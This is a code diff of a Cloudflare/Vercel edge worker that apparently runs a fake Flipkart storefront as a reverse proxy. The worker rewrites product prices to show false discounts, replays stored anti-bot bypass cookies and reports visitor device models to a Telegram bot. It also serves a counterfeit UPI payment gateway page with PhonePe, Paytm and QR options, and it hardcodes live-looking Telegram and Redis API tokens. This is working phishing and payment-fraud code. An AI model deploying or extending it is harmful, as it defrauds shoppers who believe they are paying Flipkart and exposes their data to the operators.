@@ -3,68 +3,742 @@ export const config = {
 };
 
 // ── Vercel Edge Runtime HTMLRewriter Polyfill ───────────────────
-if (typeof globalThis.HTMLRewriter === "undefined") {
+if (typeof globalThis.HTMLRewriter === 'undefined') {
   globalThis.HTMLRewriter = class HTMLRewriter {
     constructor() {
-      this.headPrepends = [];
-      this.headAppends = [];
-      this.handlers = [];
+      this.selectors = [];
     }
     on(selector, handler) {
-      if (selector === "head" && handler && handler.element) {
-        const self = this;
-        handler.element({
-          prepend(content, opts) { self.headPrepends.push(content); },
-          append(content, opts) { self.headAppends.push(content); }
-        });
-      }
+      this.selectors.push({ selector, handler });
       return this;
     }
-    transform(response) {
+    async transform(response) {
       if (!response || !response.body) return response;
-      const prepends = this.headPrepends.join("");
-      const appends = this.headAppends.join("");
-      if (!prepends && !appends) return response;
+      let text = await response.text();
 
-      const reader = response.body.getReader();
-      const encoder = new TextEncoder();
-      const decoder = new TextDecoder();
-
-      const stream = new ReadableStream({
-        async start(controller) {
-          let headDone = false;
-          while (true) {
-            const { done, value } = await reader.read();
-            if (done) break;
-            let text = decoder.decode(value, { stream: true });
-            if (!headDone) {
-              if (prepends && text.includes("<head>")) {
-                text = text.replace("<head>", "<head>" + prepends);
-              }
-              if (appends && text.includes("</head>")) {
-                text = text.replace("</head>", appends + "</head>");
-              }
-            }
-            controller.enqueue(encoder.encode(text));
+      for (const { selector, handler } of this.selectors) {
+        if (selector === 'head' && handler && handler.element) {
+          let prepends = '';
+          let appends = '';
+          handler.element({
+            prepend(content) { prepends += content; },
+            append(content) { appends += content; }
+          });
+          if (prepends && text.includes('<head>')) {
+            text = text.replace('<head>', '<head>' + prepends);
           }
-          controller.close();
+          if (appends && text.includes('</head>')) {
+            text = text.replace('</head>', appends + '</head>');
+          }
         }
-      });
+      }
 
-      return new Response(stream, {
+      for (const { selector, handler } of this.selectors) {
+        if (selector.startsWith('[') && selector.endsWith(']') && handler && handler.element) {
+          const attr = selector.slice(1, -1);
+          const regex = new RegExp(`\\b${attr}=(["'])(.*?)\\1`, 'gi');
+          text = text.replace(regex, (match, quote, val) => {
+            let newVal = val;
+            handler.element({
+              getAttribute(a) { return a === attr ? val : null; },
+              setAttribute(a, v) { if (a === attr) newVal = v; }
+            });
+            return `${attr}=${quote}${newVal}${quote}`;
+          });
+        }
+      }
+
+      const textHandlers = this.selectors.filter(s => s.handler && s.handler.text && s.selector !== 'head' && !s.selector.startsWith('['));
+      if (textHandlers.length > 0) {
+        text = text.replace(/(>)([^<]*₹[^<]*)(<)/g, (match, open, content, close) => {
+          let modifiedContent = content;
+          for (const { handler } of textHandlers) {
+            handler.text({
+              text: modifiedContent,
+              replace(newTxt) { modifiedContent = newTxt; }
+            });
+          }
+          return open + modifiedContent + close;
+        });
+      }
+
+      return new Response(text, {
         status: response.status,
         statusText: response.statusText,
-        headers: response.headers,
+        headers: response.headers
       });
     }
   };
 }
 
-function btoaUtf8(str) {
-  return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (match, p1) => String.fromCharCode("0x" + p1)));
+// Flipkart Reverse Proxy — Cloudflare Worker v9
+// Based on: oldworker.js stable routing + Session 8 pricing (help.txt)
+// Fixes: fetch Request object bug, catch-all ₹ server-side, hydration interceptors
+
+const TG_TOKEN = "8646739925:zAEB4vFZjfGm7nLghRqjkEb88aKtr5aIqvg";
+const TG_CHAT = "8664945781";
+const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+
+const BASE_UA =
+  "Mozilla/5.0 (Linux; Android 16; RMX3853 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.7778.215 Mobile Safari/537.36";
+const MOBILE_UA = BASE_UA + " FKUA/msite/0.0.3/msite/Mobile";
+const DESKTOP_UA =
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
+
+const API_DOMAINS = /^(?:[a-z0-9.-]+\.)?flipkart\.com$/i;
+const CDN_DOMAINS =
+  /^(static-assets-web|rukminim\d*|img\d*a?|assetscdn|fk-p-linchpin-web|fk-cp-zion|fk-p-zion|dlcdn|dl-web)\.flixcart\.com$/;
+const STATIC_EXT =
+  /\.(png|jpg|jpeg|gif|webp|svg|woff2?|ttf|eot|ico|mp4|webm|css|js|map)$/i;
+const MOCK_DOMAINS = /^(\d*\.?sonic\.fdp\.api|sspa|events)\.flipkart\.com$/;
+
+let _bypassCache = "";
+let _bypassCacheAt = 0;
+const BYPASS_TTL_MS = 5 * 60 * 1000;
+const ALLOWED_BYPASS_COOKIE_RE =
+  /^(cf_clearance|ak_bmsc|bm_sz|_abck|_pxhd|_px\d?|__fbp|_gcl_au)$/i;
+
+// ── Telegram ──────────────────────────────────────────────────
+async function tg(text, targetChat = TG_CHAT) {
+  try {
+    await fetch(TG_API, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: targetChat,
+        text: String(text).slice(0, 4096),
+        parse_mode: "HTML",
+      }),
+    });
+  } catch (_) { }
 }
 
-const PAYMENT_HTML = `<!DOCTYPE html>
+
+
+// ── Upstash Redis Helpers (REST API) ──────────────────────────
+const REDIS_URL = "https://bursting-anchovy-154415.upstash.io";
+const REDIS_TOKEN = "gQAAAAAAAlsvAAIgcDFiZjE0OWRkNmMyYWU0ZjdhOWMyYTQ1NTVhNDVlMDc2OA";
+
+async function getRedis(key) {
+  try {
+    const res = await fetch(`${REDIS_URL}/get/${key}`, {
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    });
+    if (!res.ok) return null;
+    const data = await res.json();
+    return data.result; // Upstash REST JSON format returns actual value in .result
+  } catch (e) {
+    return null;
+  }
+}
+
+async function setRedis(key, value) {
+  try {
+    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}`, {
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    });
+  } catch (e) { }
+}
+
+async function deleteRedis(key) {
+  try {
+    await fetch(`${REDIS_URL}/del/${key}`, {
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    });
+  } catch (e) { }
+}
+
+// ── Refactored KV helpers using Redis ──────────────────────────
+let _discountCache = -1;
+let _discountCacheAt = 0;
+const DISCOUNT_TTL_MS = 10 * 1000; // Cache discount for 10 seconds
+
+async function getDiscount() {
+  const now = Date.now();
+  if (_discountCache !== -1 && now - _discountCacheAt < DISCOUNT_TTL_MS) {
+    return _discountCache;
+  }
+  try {
+    const val = await getRedis("discount");
+    const n = parseFloat(val);
+    const finalPct = !isNaN(n) && n >= 5 && n <= 99 ? n : 0;
+    _discountCache = finalPct;
+    _discountCacheAt = now;
+    return finalPct;
+  } catch (_) {
+    return 0;
+  }
+}
+
+async function setDiscount(pct) {
+  try {
+    if (!pct || pct <= 0) {
+      await deleteRedis("discount");
+      _discountCache = 0;
+    } else {
+      await setRedis("discount", String(pct));
+      _discountCache = pct;
+    }
+    _discountCacheAt = Date.now();
+  } catch (_) { }
+}
+
+// ── Indian number formatter: 56900 → "56,900" ─────────────────
+function fmtIndian(n) {
+  if (n <= 999) return String(n);
+  const s = String(n);
+  const last3 = s.slice(-3);
+  let rest = s.slice(0, -3);
+  const parts = [];
+  while (rest.length > 2) {
+    parts.unshift(rest.slice(-2));
+    rest = rest.slice(0, -2);
+  }
+  if (rest) parts.unshift(rest);
+  return parts.join(",") + "," + last3;
+}
+
+// ── Mobile Device Model Parsing & Visitor Notification ─────────
+function parseModelFromRequest(request) {
+  let chModel = request.headers.get("sec-ch-ua-model");
+  if (chModel) {
+    return chModel.replace(/"/g, "").trim();
+  }
+  const ua = request.headers.get("user-agent") || "";
+  if (!ua) return "Unknown";
+  if (ua.includes("iPhone")) return "iPhone";
+  if (ua.includes("iPad")) return "iPad";
+  if (ua.includes("iPod")) return "iPod";
+
+  const androidMatch = ua.match(/Android\s+\d+;\s+([^;)]+)/);
+  if (androidMatch) {
+    let model = androidMatch[1].trim();
+    if (model.includes("Build/")) {
+      model = model.split("Build/")[0].trim();
+    }
+    if (model === "K" || model === "k") {
+      return "Android Device";
+    }
+    return model;
+  }
+  return "Other/Desktop";
+}
+
+async function handleNewVisitor(modelNum) {
+  try {
+    const rawList = await getRedis("devices_list");
+    let devices = [];
+    if (rawList) {
+      devices = JSON.parse(rawList);
+    }
+    if (!devices.includes(modelNum)) {
+      devices.push(modelNum);
+      await setRedis("devices_list", JSON.stringify(devices));
+
+      const listenState = await getRedis("listen_state") || "on";
+      if (listenState === "on") {
+        await tg(`📱 <b>New User Visited</b>\nModel Number: <code>${modelNum}</code>`);
+      }
+    }
+  } catch (e) { }
+}
+
+// ── Server-side JSON discount ─────────────────────────────────
+// Layer 1: Called on EVERY JSON API response before React sees it
+function applyDiscountToJson(jsonStr, pct) {
+  if (!pct || pct <= 0) return jsonStr;
+  // Skip very large responses to avoid Worker CPU timeout
+  if (jsonStr.length > 2500000) {
+    // Use regex fallback for large responses (much cheaper)
+    return applyDiscountToRegexFallback(jsonStr, pct);
+  }
+  try {
+    const obj = JSON.parse(jsonStr);
+    discObjServer(obj, pct, false, false, false, 0);
+    return JSON.stringify(obj);
+  } catch (e) {
+    return applyDiscountToRegexFallback(jsonStr, pct);
+  }
+}
+
+
+function isServerMrpKey(k) {
+  if (!k) return false;
+  const lk = k.toLowerCase();
+  const mrpKeys = {
+    mrp: 1,
+    maxretailprice: 1,
+    strikethroughprice: 1,
+    strikeprice: 1,
+    strikeoffprice: 1,
+    strikeoff: 1,
+    mrpvalue: 1,
+    totalmrp: 1,
+    originalprice: 1,
+    wasprice: 1,
+    listprice: 1,
+    retailprice: 1,
+  };
+  if (mrpKeys[lk]) return true;
+  if (lk.includes("mrp")) return true;
+  if (lk.includes("strike")) return true;
+  if (
+    lk.includes("originalprice") ||
+    lk.includes("wasprice") ||
+    lk.includes("listprice") ||
+    lk.includes("retailprice")
+  ) {
+    return true;
+  }
+  if (lk.includes("beforediscount") || lk.includes("prediscount")) return true;
+  return false;
+}
+
+function isMrpString(s) {
+  if (!s || typeof s !== "string") return false;
+  const ls = s.toLowerCase().trim();
+  return (
+    ls === "mrp" ||
+    ls === "m.r.p." ||
+    ls === "strikeoff" ||
+    ls === "strikeoffprice"
+  );
+}
+
+function isMrpKeyVal(k, val) {
+  if (!k) return false;
+  const lk = k.toLowerCase();
+  if (
+    lk.includes("strike") ||
+    lk.includes("mrp") ||
+    lk.includes("original") ||
+    lk.includes("was")
+  ) {
+    if (val === true || String(val).toLowerCase() === "true") {
+      return true;
+    }
+  }
+  return false;
+}
+
+function isServerDiscountPercentageKey(k) {
+  if (!k) return false;
+  const lk = k.toLowerCase();
+  return lk.includes("discount") || lk.includes("off") || lk.includes("savings");
+}
+
+function isServerPriceKey(k) {
+  if (!k) return false;
+  const lk = k.toLowerCase();
+  const serverPK = {
+    finalprice: 1,
+    mrp: 1,
+    sellingprice: 1,
+    basesellingprice: 1,
+    primaryproductprice: 1,
+    totalprice: 1,
+    discountedprice: 1,
+    effectiveprice: 1,
+    listingprice: 1,
+    price: 1,
+    strikethroughprice: 1,
+    offerprice: 1,
+    saleprice: 1,
+    baseprice: 1,
+    maxretailprice: 1,
+    retailprice: 1,
+    sp: 1,
+    fp: 1,
+    unitprice: 1,
+    specialprice: 1,
+    totalamount: 1,
+    carttotal: 1,
+    ordertotal: 1,
+    payableamount: 1,
+    grandtotal: 1,
+    subtotal: 1,
+    itemtotal: 1,
+    netprice: 1,
+    strikeprice: 1,
+    ourprice: 1,
+    bestprice: 1,
+    lowestprice: 1,
+    coinvalue: 1,
+    feelabelprice: 1,
+    strikeoffprice: 1,
+    strikeoff: 1,
+    originalprice: 1,
+    listprice: 1,
+    wasprice: 1,
+    mrpvalue: 1,
+    displayprice: 1,
+    totalmrp: 1,
+    totalsavings: 1,
+    totalsellingprice: 1,
+    totalcharge: 1,
+    totalcharges: 1,
+    totalpayable: 1,
+    checkouttotal: 1,
+    baskettotal: 1,
+    orderamount: 1,
+    cartamount: 1,
+    totalsp: 1,
+    totalfinalprice: 1,
+    codcharges: 1,
+    deliverycharge: 1,
+    offersavings: 1,
+    totaldiscount: 1,
+    bagtotal: 1,
+    checkoutamount: 1,
+    paymentamount: 1,
+    billamount: 1,
+  };
+  return (
+    !!serverPK[lk] ||
+    lk.includes("price") ||
+    lk.includes("mrp") ||
+    lk.includes("strike") ||
+    lk.includes("amount") ||
+    lk.includes("payable") ||
+    lk.includes("saving") ||
+    lk.includes("charge") ||
+    lk.includes("fee") ||
+    lk.includes("tax")
+  );
+}
+
+function discObjServer(o, pct, pp, isMrpContext, isDiscountContext, _depth) {
+  if (!o || typeof o !== "object") return;
+  if (o.__sd) return;
+  const depth = _depth || 0;
+  if (depth > 25) return;
+  try {
+    Object.defineProperty(o, "__sd", { value: true, writable: true, enumerable: false, configurable: true });
+  } catch (_) {
+    o.__sd = true;
+  }
+  const mult = (100 - pct) / 100;
+  const inr =
+    o.currency === "INR" ||
+    o.currencySymbol === "₹" ||
+    o.currencySymbol === "\u20b9";
+  const sd = true;
+
+  let objectIsMrp = isMrpContext;
+  let objectIsDiscount = isDiscountContext;
+  if (!Array.isArray(o)) {
+    for (const k in o) {
+      if (Object.prototype.hasOwnProperty.call(o, k)) {
+        const val = o[k];
+        if (isMrpKeyVal(k, val)) {
+          objectIsMrp = true;
+        }
+        if (typeof val === "string") {
+          if (isMrpString(val)) {
+            objectIsMrp = true;
+          }
+          const lval = val.toLowerCase();
+          if (lval === "percentage" || lval.includes("discount")) {
+            objectIsDiscount = true;
+          }
+        } else if (val && typeof val === "object" && !Array.isArray(val)) {
+          // Depth-2 scan
+          for (const k2 in val) {
+            if (Object.prototype.hasOwnProperty.call(val, k2)) {
+              const val2 = val[k2];
+              if (isMrpKeyVal(k2, val2)) {
+                objectIsMrp = true;
+              }
+              if (typeof val2 === "string") {
+                if (isMrpString(val2)) {
+                  objectIsMrp = true;
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+
+  for (const k in o) {
+    if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
+    const v = o[k];
+    const isExplicitSellingKey = isServerPriceKey(k) && !isServerMrpKey(k);
+    const currentIsMrp = isExplicitSellingKey ? false : (objectIsMrp || isServerMrpKey(k));
+    const currentIsDiscount = objectIsDiscount || isServerDiscountPercentageKey(k);
+
+
+
+    if (v && typeof v === "object") {
+      discObjServer(v, pct, sd || isServerPriceKey(k), currentIsMrp, currentIsDiscount, depth + 1);
+    } else if (typeof v === "number") {
+      if ((currentIsDiscount || isServerDiscountPercentageKey(k)) && v < 100) {
+        o[k] = pct;
+      } else if (isServerPriceKey(k) && !currentIsMrp && v >= 500) {
+        o[k] = Math.round(v * mult);
+      } else if (
+        sd &&
+        !currentIsMrp &&
+        (k === "value" || k === "valueInRupees" || k === "amount" || k === "num") &&
+        v >= 500
+      ) {
+        o[k] = Math.round(v * mult);
+      }
+    } else if (typeof v === "string") {
+      if (currentIsDiscount || isServerDiscountPercentageKey(k)) {
+        if (v.includes("%")) {
+          o[k] = v.replace(/\d+%/g, pct + "%");
+        } else {
+          const num = parseFloat(v);
+          if (!isNaN(num) && num < 100) o[k] = String(pct);
+        }
+      } else if (v.indexOf("₹") !== -1 || v.indexOf("\u20b9") !== -1) {
+        if (!isServerMrpKey(k) && !currentIsMrp) {
+          o[k] = v.replace(/(?:₹|\u20b9)\s*([\d,]+)/g, (m, p) => {
+            const n = parseInt(p.replace(/,/g, ""), 10);
+            if (isNaN(n) || n < 500) return m;
+            return (
+              (m.charAt(0) === "₹" ? "₹" : "\u20b9") +
+              fmtIndian(Math.round(n * mult))
+            );
+          });
+        }
+      } else if (isServerPriceKey(k) && !currentIsMrp) {
+        const num = parseFloat(v.replace(/,/g, ""));
+        if (!isNaN(num) && num >= 500) o[k] = (num * mult).toFixed(2);
+      } else if (
+        sd &&
+        !currentIsMrp &&
+        (k === "decimalValue" ||
+          k === "value" ||
+          k === "valueInRupees" ||
+          k === "amount" ||
+          k === "text" ||
+          k === "displayValue" ||
+          k === "formattedValue" ||
+          k === "displayPrice" ||
+          k === "label" ||
+          k === "title" ||
+          k === "subText" ||
+          k === "header")
+      ) {
+        const num = parseFloat(v.replace(/,/g, ""));
+        if (!isNaN(num) && num >= 500) {
+          o[k] = v.includes(",")
+            ? fmtIndian(Math.round(num * mult))
+            : (num * mult).toFixed(2);
+        }
+      }
+    }
+  }
+}
+
+function applyDiscountToRegexFallback(jsonStr, pct) {
+  const mult = (100 - pct) / 100;
+  let out = jsonStr;
+  out = out.replace(/(?:₹|\\u20b9)([\d,]{2,})/g, (m, p) => {
+    const num = parseInt(p.replace(/,/g, ""), 10);
+    if (isNaN(num) || num < 500) return m;
+    return (
+      (m.charAt(0) === "₹" ? "₹" : "\\u20b9") +
+      fmtIndian(Math.round(num * mult))
+    );
+  });
+  const priceKeyRegex = /"([^"]*(?:price|selling|sp|final|offer|special|amount|value)[^"]*)"\s*:\s*(\d{3,7})/gi;
+  out = out.replace(priceKeyRegex, (m, key, valStr) => {
+    const lk = key.toLowerCase();
+    if (lk.includes("mrp") || lk.includes("strike") || lk.includes("max") || lk.includes("original") || lk.includes("count") || lk.includes("id")) return m;
+    const num = parseInt(valStr, 10);
+    if (isNaN(num) || num < 500) return m;
+    return `"${key}":${Math.round(num * mult)}`;
+  });
+  return out;
+}
+
+// ── DOM price rewriter script (client-side safety net) ────────
+function buildDomPriceScript(pct) {
+  if (!pct || pct <= 0) return "";
+  return `<script>
+(function(){
+var PCT=${pct};
+var MULT=(100-PCT)/100;
+function fi(n){
+  if(n<=999)return String(n);
+  var s=String(n),l=s.slice(-3),r=s.slice(0,-3),p=[];
+  while(r.length>2){p.unshift(r.slice(-2));r=r.slice(0,-2);}
+  if(r)p.unshift(r);
+  return p.join(',')+','+l;
+}
+var DOM_THRESH=Math.max(500,Math.round(500/MULT));
+function isStrikethroughEl(el) {
+  var node = el;
+  var depth = 0;
+  while (node && node !== document.body && depth < 4) {
+    var tag = (node.tagName || '').toUpperCase();
+    if (tag === 'DEL' || tag === 'S' || tag === 'STRIKE') return true;
+    if (tag === 'BUTTON' || tag === 'A' || tag === 'INPUT' || tag === 'OPTION') return true;
+    if (node.getAttribute && node.getAttribute('role') === 'button') return true;
+    var cl = (node.className || '');
+    if (typeof cl === 'string') {
+      var lcl = cl.toLowerCase();
+      if (lcl.indexOf('strike') !== -1 || 
+          lcl.indexOf('line-through') !== -1 || 
+          lcl.indexOf('_3i9_r9') !== -1 || 
+          lcl.indexOf('btn') !== -1 ||
+          lcl.indexOf('button') !== -1 ||
+          lcl.indexOf('buy') !== -1 ||
+          lcl.indexOf('checkout') !== -1 ||
+          lcl.indexOf('action') !== -1 ||
+          lcl.indexOf('cart') !== -1 ||
+          lcl.indexOf('pay') !== -1 ||
+          lcl.indexOf('_2kpz6l') !== -1 ||
+          lcl.indexOf('_3a16wa') !== -1) {
+        return true;
+      }
+    }
+    var idAndTestId = (node.id || '') + ' ' + (node.getAttribute ? (node.getAttribute('data-testid') || '') : '');
+    var lIdTest = idAndTestId.toLowerCase();
+    if (lIdTest.indexOf('buy') !== -1 || 
+        lIdTest.indexOf('checkout') !== -1 || 
+        lIdTest.indexOf('cart') !== -1 || 
+        lIdTest.indexOf('button') !== -1 || 
+        lIdTest.indexOf('btn') !== -1) {
+      return true;
+    }
+    var style = node.getAttribute ? (node.getAttribute('style') || '') : '';
+    if (style.indexOf('line-through') !== -1) return true;
+    node = node.parentNode;
+    depth++;
+  }
+  return false;
+}
+function fixNode(node){
+  if(node.nodeType===3){
+    var t=node.textContent;
+    if(t.indexOf('\u20b9')!==-1){
+      if(!isStrikethroughEl(node.parentNode)){
+        var nt=t.replace(/\u20b9\\s*([\\d,]+)/g,function(m,ns){
+          var n=parseInt(ns.replace(/,/g,''),10);
+          if(isNaN(n)||n<DOM_THRESH)return m;
+          return '\u20b9'+fi(Math.round(n*MULT));
+        });
+        if(nt!==t)node.textContent=nt;
+      }
+    } else if(t.indexOf('%')!==-1){
+      var trimmed = t.trim();
+      if(trimmed.length <= 12 && /\\d+%/g.test(trimmed)){
+        var nt=t.replace(/\\d+%/g, PCT+'%');
+        if(nt!==t)node.textContent=nt;
+      }
+    }
+  }else if(node.nodeType===1){
+    var tag=node.tagName;
+    if(tag==='SCRIPT'||tag==='STYLE'||tag==='NOSCRIPT'||tag==='TEXTAREA')return;
+    for(var i=0;i<node.childNodes.length;i++)fixNode(node.childNodes[i]);
+  }
+}
+function fixSubtree(el){
+  try{fixNode(el);}catch(e){}
+}
+function start(){
+  fixSubtree(document.body);
+  // Only observe NEW nodes being added - don't observe characterData
+  // This prevents the React vs MutationObserver infinite loop
+  var obs=new MutationObserver(function(mutations){
+    for(var i=0;i<mutations.length;i++){
+      var added=mutations[i].addedNodes;
+      if(added&&added.length){
+        for(var j=0;j<added.length;j++){
+          if(added[j].nodeType===1||added[j].nodeType===3){
+            fixSubtree(added[j]);
+          }
+        }
+      }
+    }
+  });
+  obs.observe(document.body,{childList:true,subtree:true});
+}
+if(document.body){start();}else{document.addEventListener('DOMContentLoaded',start);}
+window.addEventListener('pageshow',function(e){
+  if(e.persisted){window.location.replace(window.location.protocol+'//'+window.location.host+'/');}
+});
+})();
+<\/script>`;
+}
+
+// ── Cookie jar ────────────────────────────────────────────────
+// IMPORTANT: NO shared cookieJar. Each request creates its own reqJar
+// (Map) in the fetch handler. Module-level bypassJar holds ONLY
+// non-session bypass cookies — never user session/login cookies.
+// This prevents Account A's session leaking to User B.
+const bypassJar = new Map(); // module-level: bypass cookies only
+
+function parseCookies(list, jar) {
+  for (const h of list) {
+    const part = h.split(";")[0].trim();
+    const eq = part.indexOf("=");
+    if (eq > 0) jar.set(part.slice(0, eq).trim(), part.slice(eq + 1).trim());
+  }
+}
+
+function buildCookieHeader(incoming, jar) {
+  const stored = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
+  if (!incoming) return stored;
+  if (!stored) return incoming;
+  const m = new Map();
+  for (const p of incoming.split(";")) {
+    const e = p.indexOf("=");
+    if (e > 0) m.set(p.slice(0, e).trim(), p.slice(e + 1).trim());
+  }
+  for (const [k, v] of jar) m.set(k, v);
+  return [...m.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
+}
+
+function _applyBypassString(str) {
+  // Writes ONLY to bypassJar (module-level), never to per-request jar
+  for (const part of str.split(";")) {
+    const eq = part.indexOf("=");
+    if (eq <= 0) continue;
+    const k = part.slice(0, eq).trim();
+    const v = part.slice(eq + 1).trim();
+    if (k && v) bypassJar.set(k, v);
+  }
+}
+
+async function loadBypassCookies() {
+  const now = Date.now();
+  if (_bypassCache && now - _bypassCacheAt < BYPASS_TTL_MS) {
+    _applyBypassString(_bypassCache);
+    return;
+  }
+  try {
+    const saved = await getRedis("bypass_cookies");
+    _bypassCache = saved || "";
+    _bypassCacheAt = now;
+    if (saved) _applyBypassString(saved);
+  } catch (_) { }
+}
+
+// jar = per-request Map — only safe (non-session) cookies saved to Redis
+async function saveBypassCookies(jar) {
+  if (!jar || jar.size === 0) return;
+  try {
+    const safe = [...jar.entries()]
+      .filter(([k]) => ALLOWED_BYPASS_COOKIE_RE.test(k))
+      .map(([k, v]) => `${k}=${v}`)
+      .join("; ");
+    if (safe) {
+      _applyBypassString(safe); // update module-level bypassJar too
+      _bypassCache = safe;
+      _bypassCacheAt = Date.now();
+      await setRedis("bypass_cookies", safe);
+    }
+  } catch (_) { }
+}
+
+function servePaymentGatewayPage(request, origin) {
+  const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
@@ -544,7 +1218,7 @@ const PAYMENT_HTML = `<!DOCTYPE html>
                         <label>Road name, Area, Colony (Required)*</label>
                     </div>
                     <div class="shipping-banner">
-                        <img src="assets/free_shippingbanner.gif" alt="Free Shipping" />
+                        <img src="https://paymentgataway.vercel.app/assets/free_shippingbanner.gif" alt="Free Shipping" />
                     </div>
                     <button type="submit" class="save-address-btn">Save Address</button>
                 </form>
@@ -611,7 +1285,7 @@ const PAYMENT_HTML = `<!DOCTYPE html>
                 <div class="rounded-lg border bg-white pb-2 border-gray-200">
                     <label class="form-check active" pay-type="phonepe">
                         <div class="flex items-center gap-2">
-                            <img src="assets/images/phonepe.svg" class="w-6 h-6" />
+                            <img src="https://paymentgataway.vercel.app/assets/images/phonepe.svg" class="w-6 h-6" />
                             <span class="text-sm font-medium">PhonePe</span>
                         </div>
                         <input type="radio" name="upiApp" value="phonepe" class="accent-blue-600" checked />
@@ -619,7 +1293,7 @@ const PAYMENT_HTML = `<!DOCTYPE html>
 
                     <label class="form-check" pay-type="paytm">
                         <div class="flex items-center gap-2">
-                            <img src="assets/images/paytm_icon.svg" class="w-6 h-6" />
+                            <img src="https://paymentgataway.vercel.app/assets/images/paytm_icon.svg" class="w-6 h-6" />
                             <span class="text-sm font-medium">Paytm</span>
                         </div>
                         <input type="radio" name="upiApp" value="paytm" class="accent-blue-600" />
@@ -627,7 +1301,7 @@ const PAYMENT_HTML = `<!DOCTYPE html>
 
                     <label class="form-check" pay-type="qr_upi">
                         <div class="flex items-center gap-2">
-                            <img src="assets/images/qr.png" class="w-6 h-6" />
+                            <img src="https://paymentgataway.vercel.app/assets/images/qr.png" class="w-6 h-6" />
                             <span class="text-sm font-medium">QR Code</span>
                         </div>
                         <input type="radio" name="upiApp" value="qr_upi" class="accent-blue-600" />
@@ -637,7 +1311,7 @@ const PAYMENT_HTML = `<!DOCTYPE html>
                     <div class="modal" id="qrModal">
                         <div class="modal-content">
                             <div class="modal-header" style="border:none; padding-bottom:0; background-color:#2874f0;">
-                                <img src="assets/images/Q18Ifxk.png" style="width:100%; padding:0 103px; margin-bottom:10px;"/>
+                                <img src="https://paymentgataway.vercel.app/assets/images/Q18Ifxk.png" style="width:100%; padding:0 103px; margin-bottom:10px;"/>
                             </div>
                             <div class="modal-body" style="display:flex; padding-top:22px; flex-direction:column; align-items:center; padding:15px 0;">
                                 <div id="qr-loading" class="qr-skeleton-wrap" style="display:none; flex-direction:column; align-items:center; gap:12px; padding:12px 0;">
@@ -647,9 +1321,9 @@ const PAYMENT_HTML = `<!DOCTYPE html>
                                 <div id="qr-code" style="margin-top:-20px; margin-bottom:10px;"></div>
                                 <p class="text-center" style="font-size:11px;">Scan the QR Code and Pay from any UPI App</p>
                                 <div class="flex gap-5 py-3">
-                                    <img src="assets/images/gpay_icon.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
-                                    <img src="assets/images/phonepe.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
-                                    <img src="assets/images/paytm_images-n.png" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
+                                    <img src="https://paymentgataway.vercel.app/assets/images/gpay_icon.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
+                                    <img src="https://paymentgataway.vercel.app/assets/images/phonepe.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
+                                    <img src="https://paymentgataway.vercel.app/assets/images/paytm_images-n.png" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
                                     <img src="https://img.icons8.com/color/48/bhim.png" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
                                 </div>
                             </div>
@@ -938,7 +1612,7 @@ const PAYMENT_HTML = `<!DOCTYPE html>
                 btn.innerHTML = 'View QR Code';
                 btn.onclick = () => openQRModal();
             } else {
-                btn.innerHTML = \`Pay \u20b9\${amount}\`;
+                btn.innerHTML = \`Pay \\u20b9\${amount}\`;
                 btn.onclick = () => payNow();
             }
         }
@@ -1187,569 +1861,15 @@ const PAYMENT_HTML = `<!DOCTYPE html>
         document.addEventListener('selectstart', (e) => e.preventDefault());
     </script>
 </body>
-</html>
-`;
+</html>`;
 
-
-
-// Flipkart Reverse Proxy — Cloudflare Worker v9
-// Based on: oldworker.js stable routing + Session 8 pricing (help.txt)
-// Fixes: fetch Request object bug, catch-all ₹ server-side, hydration interceptors
-
-const TG_TOKEN = "8646739925:AAEB4vFZjfGm7nLghRqjkEb88aKtr5aIqvg";
-const TG_CHAT = "8664945781";
-const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-
-const BASE_UA =
-  "Mozilla/5.0 (Linux; Android 16; RMX3853 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.7778.215 Mobile Safari/537.36";
-const MOBILE_UA = BASE_UA + " FKUA/msite/0.0.3/msite/Mobile";
-const DESKTOP_UA =
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
-
-const API_DOMAINS = /^(?:[a-z0-9.-]+\.)?flipkart\.com$/i;
-const CDN_DOMAINS =
-  /^(static-assets-web|rukminim\d*|img\d*a?|assetscdn|fk-p-linchpin-web|fk-cp-zion|fk-p-zion|dlcdn|dl-web)\.flixcart\.com$/;
-const STATIC_EXT =
-  /\.(png|jpg|jpeg|gif|webp|svg|woff2?|ttf|eot|ico|mp4|webm|css|js|map)$/i;
-const MOCK_DOMAINS = /^(\d*\.?sonic\.fdp\.api|sspa|events)\.flipkart\.com$/;
-
-let _bypassCache = "";
-let _bypassCacheAt = 0;
-const BYPASS_TTL_MS = 5 * 60 * 1000;
-const ALLOWED_BYPASS_COOKIE_RE =
-  /^(cf_clearance|ak_bmsc|bm_sz|_abck|_pxhd|_px\d?|__fbp|_gcl_au)$/i;
-
-async function tg(text) {
-  await tg_to_chat(TG_CHAT, text);
-}
-
-async function tg_to_chat(chatId, text) {
-  try {
